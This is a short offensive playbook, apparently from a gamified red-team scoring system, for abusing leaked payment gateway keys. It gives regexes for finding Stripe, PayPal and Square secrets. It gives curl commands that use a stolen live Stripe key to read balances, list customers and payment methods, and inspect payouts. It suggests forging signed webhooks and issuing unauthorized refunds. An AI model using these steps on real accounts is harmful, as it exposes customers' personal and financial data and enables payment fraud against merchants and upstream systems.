# Playbook: Payment Gateway API Key Abuse & Triage

## 1. Overview
* **Artifact Type**: `payment_gateway_key`
* **Base Value**: 275 ROOT
* **Severity**: Critical
* **Prerequisites**: Read access to source code repos, server configuration files, or container manifests.

Payment gateway secret keys (`sk_live_...`, `rk_live_...`, PayPal Client Secrets, Square access tokens) grant administrative control over merchant accounts, billing databases, customer PII, and financial settlement schedules.

---

## 2. Artifact Detection & Matching Patterns
* **Stripe Secret**: `sk_live_[a-zA-Z0-9]{24,}`
* **Stripe Restricted**: `rk_live_[a-zA-Z0-9]{24,}`
* **Stripe Webhook Secret**: `whsec_[a-zA-Z0-9]{24,}`
* **PayPal API Secret**: `PAYPAL_CLIENT_SECRET = <value>`
* **Square Token**: `sq0atp-[a-zA-Z0-9_-]{22,}` or `EAAA[a-zA-Z0-9_-]{60,}`

---

## 3. Triage & Permission Audit

### Step 1: Stripe Key Audit
Immediately inspect balance and key permissions without generating intrusive webhooks:
```bash
# Verify key validity and inspect available balance
curl -s -u "sk_live_...:" https://api.stripe.com/v1/balance
```

### Step 2: Customer & PII Enumeration
Enumerate registered customers, stored credit card fingerprints, and bank accounts:
```bash
# List top 10 customers with email and payment methods
curl -s -u "sk_live_...:" "https://api.stripe.com/v1/customers?limit=10"
```

### Step 3: Payout & Settlement Inspection
Inspect where merchant funds are settled:
```bash
curl -s -u "sk_live_...:" "https://api.stripe.com/v1/payouts?limit=5"
curl -s -u "sk_live_...:" "https://api.stripe.com/v1/accounts/current"
```

---

## 4. Downstream Pivot Chains
1. **Webhook Tampering (`whsec_...`)**:
   - Fabricate validly signed `charge.succeeded` or `invoice.payment_succeeded` webhook payloads to compromise upstream fulfillment or SaaS provisioning systems.
2. **Refund Abuse / Credit Extraction**:
   - Issue unauthorized refunds to external cards or generate custom payout transactions if restricted permissions permit.
